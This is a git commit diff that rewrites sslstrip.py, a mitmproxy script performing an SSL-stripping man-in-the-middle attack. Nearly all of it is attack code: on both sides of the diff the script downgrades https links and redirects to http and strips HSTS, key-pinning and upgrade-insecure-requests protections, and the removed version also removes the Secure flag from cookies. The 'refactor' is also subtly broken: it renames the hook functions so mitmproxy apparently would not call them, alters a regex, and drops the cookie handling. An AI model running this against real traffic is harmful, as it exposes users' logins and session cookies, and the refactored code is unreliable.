e7bd1e74ba8acbdb3685419a772be6fb5ee42003
aaancx <ancaiorda@gmail.com>
2023-06-12 01:31:11 +0200

    Update sslstrip.py, refactor the code according to sources

--- sslstrip.py
+++ sslstrip.py
@@ -1,63 +1,39 @@
-"""
-This script implements an sslstrip-like attack based on mitmproxy.
-https://moxie.org/software/sslstrip/
-"""
 import re
 import urllib.parse
-import typing  # noqa
-
+import typing
 from mitmproxy import http
 
-# set of SSL/TLS capable hosts
-secure_hosts: typing.Set[str] = set()
+allSecureHosts = set()
 
+def requestFromWebsite(httpFlow):
+    httpFlow.request.headers.pop('If-Modified-Since', None)
+    httpFlow.request.headers.pop('Cache-Control', None)
+    httpFlow.request.headers.pop('Upgrade-Insecure-Requests', None)
 
-def request(flow: http.HTTPFlow) -> None:
-    flow.request.headers.pop('If-Modified-Since', None)
-    flow.request.headers.pop('Cache-Control', None)
+    if httpFlow.request.pretty_host in allSecureHosts:
+        httpFlow.request.scheme = 'https'
+        httpFlow.request.port = 443
+        httpFlow.request.host = httpFlow.request.pretty_host
 
-    # do not force https redirection
-    flow.request.headers.pop('Upgrade-Insecure-Requests', None)
+def responseFromWebsite(httpFlow):
+    assert httpFlow.response
+    httpFlow.response.headers.pop('Strict-Transport-Security', None)
+    httpFlow.response.headers.pop('Public-Key-Pins', None)
 
-    # proxy connections to SSL-enabled hosts
-    if flow.request.pretty_host in secure_hosts:
-        flow.request.scheme = 'https'
-        flow.request.port = 443
+    httpFlow.response.content = httpFlow.response.content.replace(b'https://', b'http://')
 
-        # We need to update the request destination to whatever is specified in the host header:
-        # Having no TLS Server Name Indication from the client and just an IP address as request.host
-        # in transparent mode, TLS server name certificate validation would fail.
-        flow.request.host = flow.request.pretty_host
+    pattern_meta = br'<meta.http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.?>'
+    httpFlow.response.content = re.sub(pattern_meta, b'', httpFlow.response.content, flags=re.IGNORECASE)
 
+    if httpFlow.response.headers.get('Location', '').startswith('https://'):
+        websiteLocation = httpFlow.response.headers['Location']
+        hostWebsite = urllib.parse.urlparse(websiteLocation).hostname
+        if hostWebsite:
+            allSecureHosts.add(hostWebsite)
+        httpFlow.response.headers['Location'] = websiteLocation.replace('https://', 'http://', 1)
 
-def response(flow: http.HTTPFlow) -> None:
-    assert flow.response
-    flow.response.headers.pop('Strict-Transport-Security', None)
-    flow.response.headers.pop('Public-Key-Pins', None)
-
-    # strip links in response body
-    flow.response.content = flow.response.content.replace(b'https://', b'http://')
-
-    # strip meta tag upgrade-insecure-requests in response body
-    csp_meta_tag_pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
-    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)
-
-    # strip links in 'Location' header
-    if flow.response.headers.get('Location', '').startswith('https://'):
-        location = flow.response.headers['Location']
-        hostname = urllib.parse.urlparse(location).hostname
-        if hostname:
-            secure_hosts.add(hostname)
-        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
-
-    # strip upgrade-insecure-requests in Content-Security-Policy header
-    csp_header = flow.response.headers.get('Content-Security-Policy', '')
-    if re.search('upgrade-insecure-requests', csp_header, flags=re.IGNORECASE):
-        csp = flow.response.headers['Content-Security-Policy']
-        new_header = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
-        flow.response.headers['Content-Security-Policy'] = new_header
-
-    # strip secure flag from 'Set-Cookie' headers
-    cookies = flow.response.headers.get_all('Set-Cookie')
-    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
-    flow.response.headers.set_all('Set-Cookie', cookies)
+    headerWebsite = httpFlow.response.headers.get('Content-Security-Policy', '')
+    if re.search('upgrade-insecure-requests', headerWebsite, flags=re.IGNORECASE):
+        csp = httpFlow.response.headers['Content-Security-Policy']
+        newHeader = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
+        httpFlow.response.headers['Content-Security-Policy'] = newHeader
